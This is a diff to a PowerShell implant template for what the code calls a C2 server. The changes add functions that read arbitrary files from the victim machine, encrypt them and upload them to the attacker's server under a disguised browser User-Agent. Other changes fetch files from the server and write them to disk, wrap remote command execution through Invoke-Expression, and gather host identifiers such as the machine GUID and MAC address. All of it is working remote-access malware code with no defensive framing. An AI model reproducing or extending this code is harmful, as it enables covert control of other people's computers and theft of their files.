@@ -14,6 +14,7 @@ $serverAddress = '{{SERVER_ADDRESS}}'
 $beaconPath = '{{BEACON_PATH}}'
 $commandResultPath = '{{CMD_RESULT_PATH}}'
 $fileUploadPath = '{{FILE_UPLOAD_PATH}}'
+$fileRequestPath = '{{FILE_REQUEST_PATH}}'
 
 {{PATH_ROTATION_CODE}}
 
@@ -98,7 +99,7 @@ function Get-SystemIdentification {
         OsVersion = [System.Environment]::OSVersion.VersionString
         Architecture = if ([System.Environment]::Is64BitOperatingSystem) { "x64" } else { "x86" }
         ProcessorCount = [System.Environment]::ProcessorCount
-        TotalMemory = (Get-CimInstance -Class Win32_ComputerSystem).TotalPhysicalMemory / 1GB
+        TotalMemory = (Get-CimInstance -Class Win32_ComputerSystem -ErrorAction SilentlyContinue).TotalPhysicalMemory / 1GB
     }
     
     # Generate a unique client identifier (will be used later for re-registration)
@@ -107,7 +108,7 @@ function Get-SystemIdentification {
     
     # Get Machine GUID - this is a relatively stable identifier
     try {
-        $machineGuid = (Get-ItemProperty -Path "HKLM:\SOFTWARE\Microsoft\Cryptography" -Name "MachineGuid" -ErrorAction Stop).MachineGuid
+        $machineGuid = (Get-ItemProperty -Path "HKLM:\\SOFTWARE\\Microsoft\\Cryptography" -Name "MachineGuid" -ErrorAction Stop).MachineGuid
         $systemInfo.MachineGuid = $machineGuid
     } catch {
         $systemInfo.MachineGuid = "Unknown"
@@ -115,7 +116,7 @@ function Get-SystemIdentification {
     
     # Get MAC address of first network adapter
     try {
-        $networkAdapters = Get-CimInstance Win32_NetworkAdapterConfiguration | Where-Object { $_.IPAddress -ne $null }
+        $networkAdapters = Get-CimInstance Win32_NetworkAdapterConfiguration -ErrorAction SilentlyContinue | Where-Object { $_.IPAddress -ne $null }
         if ($networkAdapters) {
             $systemInfo.MacAddress = $networkAdapters[0].MACAddress
         } else {
@@ -127,7 +128,7 @@ function Get-SystemIdentification {
     
     # Get domain information
     try {
-        $computerSystem = Get-CimInstance Win32_ComputerSystem
+        $computerSystem = Get-CimInstance Win32_ComputerSystem -ErrorAction SilentlyContinue
         $systemInfo.Domain = $computerSystem.Domain
         $systemInfo.PartOfDomain = $computerSystem.PartOfDomain
     } catch {
@@ -143,6 +144,141 @@ function Get-SystemIdentification {
     # Convert to JSON
     $jsonInfo = ConvertTo-Json -InputObject $systemInfo -Compress
     return $jsonInfo
+}
+
+# Function to download a file from client to server
+function Download-FileToServer {
+    param([string]$FilePath)
+    
+    Write-Host "Attempting to download file: $FilePath"
+    
+    if (-not (Test-Path -Path $FilePath)) {
+        return "Error: File not found - $FilePath"
+    }
+    
+    try {
+        # Get file info
+        $fileName = Split-Path -Path $FilePath -Leaf
+        $fileSize = (Get-Item $FilePath).Length
+        
+        # Read file as bytes and encode as Base64
+        $fileBytes = [System.IO.File]::ReadAllBytes($FilePath)
+        $fileContent = [System.Convert]::ToBase64String($fileBytes)
+        
+        # Create file info object
+        $fileInfo = @{
+            FileName = $fileName
+            FileSize = $fileSize
+            FilePath = $FilePath
+            FileContent = $fileContent
+        }
+        
+        # Convert to JSON
+        $fileInfoJson = ConvertTo-Json -InputObject $fileInfo -Compress
+        
+        # Encrypt the file data
+        $encryptedFileData = Encrypt-Data -PlainText $fileInfoJson
+        
+        # Get current file upload path
+        $uploadPath = if ($global:pathRotationEnabled) { Get-CurrentPath -PathType "file_upload_path" } else { $fileUploadPath }
+        $uploadUrl = "http://$serverAddress$uploadPath"
+        
+        # Create a web client
+        $uploadClient = New-Object System.Net.WebClient
+        $systemInfo = Get-SystemIdentification
+        $encryptedSystemInfo = Encrypt-Data -PlainText $systemInfo
+        $systemInfoObj = ConvertFrom-Json -InputObject $systemInfo
+        
+        # Add headers
+        $uploadClient.Headers.Add("X-System-Info", $encryptedSystemInfo)
+        $uploadClient.Headers.Add("X-Client-ID", $systemInfoObj.ClientId)
+        if ($global:pathRotationEnabled) {
+            $uploadClient.Headers.Add("X-Rotation-ID", $global:currentRotationId)
+        }
+        $uploadClient.Headers.Add("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.110 Safari/537.36")
+        $uploadClient.Headers.Add("Content-Type", "application/json")
+        
+        # Upload the file
+        $uploadClient.UploadString($uploadUrl, $encryptedFileData)
+        
+        # Return success message
+        return "$fileSize bytes from $FilePath downloaded to server"
+    }
+    catch {
+        return "Error downloading file: $_"
+    }
+}
+
+# Function to upload a file from server to client
+function Upload-FileFromServer {
+    param(
+        [string]$ServerFilePath,
+        [string]$ClientDestination
+    )
+    
+    Write-Host "Attempting to upload file from server: $ServerFilePath to $ClientDestination"
+    
+    try {
+        # Expand environment variables in destination path
+        $expandedDestination = [System.Environment]::ExpandEnvironmentVariables($ClientDestination)
+        
+        # Create the destination directory if it doesn't exist
+        $destinationDir = Split-Path -Path $expandedDestination -Parent
+        if (-not (Test-Path -Path $destinationDir)) {
+            New-Item -Path $destinationDir -ItemType Directory -Force | Out-Null
+        }
+        
+        # Send request to server to get the file
+        $fileRequestObj = @{
+            FilePath = $ServerFilePath
+            Destination = $expandedDestination
+        }
+        
+        $fileRequestJson = ConvertTo-Json -InputObject $fileRequestObj -Compress
+        $encryptedRequest = Encrypt-Data -PlainText $fileRequestJson
+        
+        # Get current file request path
+        $fileRequestPath = if ($global:pathRotationEnabled) { Get-CurrentPath -PathType "file_request_path" } else { $fileRequestPath }
+        $fileRequestUrl = "http://$serverAddress$fileRequestPath"
+        
+        # Create a web client
+        $requestClient = New-Object System.Net.WebClient
+        $systemInfo = Get-SystemIdentification
+        $encryptedSystemInfo = Encrypt-Data -PlainText $systemInfo
+        $systemInfoObj = ConvertFrom-Json -InputObject $systemInfo
+        
+        # Add headers
+        $requestClient.Headers.Add("X-System-Info", $encryptedSystemInfo)
+        $requestClient.Headers.Add("X-Client-ID", $systemInfoObj.ClientId)
+        if ($global:pathRotationEnabled) {
+            $requestClient.Headers.Add("X-Rotation-ID", $global:currentRotationId)
+        }
+        $requestClient.Headers.Add("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.110 Safari/537.36")
+        $requestClient.Headers.Add("Content-Type", "application/json")
+        
+        # Send the request and get the response
+        $encryptedResponse = $requestClient.UploadString($fileRequestUrl, $encryptedRequest)
+        $decryptedResponse = Decrypt-Data -EncryptedBase64 $encryptedResponse
+        
+        # Parse the response
+        $fileResponse = ConvertFrom-Json -InputObject $decryptedResponse
+        
+        if ($fileResponse.Status -eq "Error") {
+            return "Error from server: $($fileResponse.Message)"
+        }
+        
+        # Decode the file content
+        $fileBytes = [System.Convert]::FromBase64String($fileResponse.FileContent)
+        
+        # Save the file to destination
+        [System.IO.File]::WriteAllBytes($expandedDestination, $fileBytes)
+        
+        # Return success message
+        return "File uploaded from server to $expandedDestination ($([Math]::Round($fileBytes.Length / 1KB, 2)) KB)"
+    }
+    catch {
+        return "Error uploading file from server: $_"
+    }
 }
 
 # Function to process commands from the C2 server
@@ -165,43 +301,50 @@ function Process-Commands {
             
             if ($commandType -eq "execute") {
                 # Execute shell command
-                $result = Invoke-Expression -Command $args | Out-String
+                try {
+                    # Use PowerShell's Invoke-Expression to properly handle PowerShell commands
+                    $result = Invoke-Expression -Command $args | Out-String
+                }
+                catch {
+                    $result = "Error executing command: $_"
+                }
             }
             elseif ($commandType -eq "upload") {
                 # Upload file from client to server
                 if (Test-Path -Path $args) {
-                    $fileName = Split-Path -Path $args -Leaf
-                    $fileContent = [System.Convert]::ToBase64String([System.IO.File]::ReadAllBytes($args))
-                    
-                    $fileInfo = @{
-                        FileName = $fileName
-                        FileContent = $fileContent
-                    }
-                    
-                    $fileInfoJson = ConvertTo-Json -InputObject $fileInfo -Compress
-                    $encryptedFileInfo = Encrypt-Data -PlainText $fileInfoJson
-                    
-                    # Get current file upload path
-                    $uploadPath = if ($global:pathRotationEnabled) { Get-CurrentPath -PathType "file_upload_path" } else { $fileUploadPath }
-                    $uploadUrl = "http://$serverAddress$uploadPath"
-                    
-                    $uploadClient = New-Object System.Net.WebClient
-                    $systemInfo = Get-SystemIdentification
-                    $encryptedSystemInfo = Encrypt-Data -PlainText $systemInfo
-                    $systemInfoObj = ConvertFrom-Json -InputObject $systemInfo
-                    
-                    $uploadClient.Headers.Add("X-System-Info", $encryptedSystemInfo)
-                    $uploadClient.Headers.Add("X-Client-ID", $systemInfoObj.ClientId)
-                    if ($global:pathRotationEnabled) {
-                        $uploadClient.Headers.Add("X-Rotation-ID", $global:currentRotationId)
-                    }
-                    $uploadClient.Headers.Add("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.110 Safari/537.36")
-                    $uploadClient.Headers.Add("Content-Type", "application/json")
-                    $uploadClient.UploadString($uploadUrl, $encryptedFileInfo)
-                    
-                    $result = "File uploaded: $fileName"
+                    $result = Download-FileToServer -FilePath $args
                 } else {
                     $result = "Error: File not found - $args"
+                }
+            }
+            elseif ($commandType -eq "download") {
+                # Download file from client to server
+                $result = Download-FileToServer -FilePath $args
+            }
+            elseif ($commandType -eq "file_upload") {
+                # Upload file from server to client (format: "Upload-File 'LocalPath' 'RemotePath'")
+                try {
+                    # Parse the arguments
+                    if ($args -match "Upload-File '(.*?)' '(.*?)'") {
+                        $serverPath = $matches[1]
+                        $clientPath = $matches[2]
+                        $result = Upload-FileFromServer -ServerFilePath $serverPath -ClientDestination $clientPath
+                    }
+                    else {
+                        # Try alternate parsing method if regex fails
+                        $argParts = $args -split "' '"
+                        if ($argParts.Count -ge 2) {
+                            $serverPath = $argParts[0].Replace("Upload-File '", "").Trim()
+                            $clientPath = $argParts[1].TrimEnd("'").Trim()
+                            $result = Upload-FileFromServer -ServerFilePath $serverPath -ClientDestination $clientPath
+                        }
+                        else {
+                            $result = "Error: Invalid file_upload command format: $args"
+                        }
+                    }
+                }
+                catch {
+                    $result = "Error processing file_upload command: $_"
                 }
             }
             elseif ($commandType -eq "system_info") {
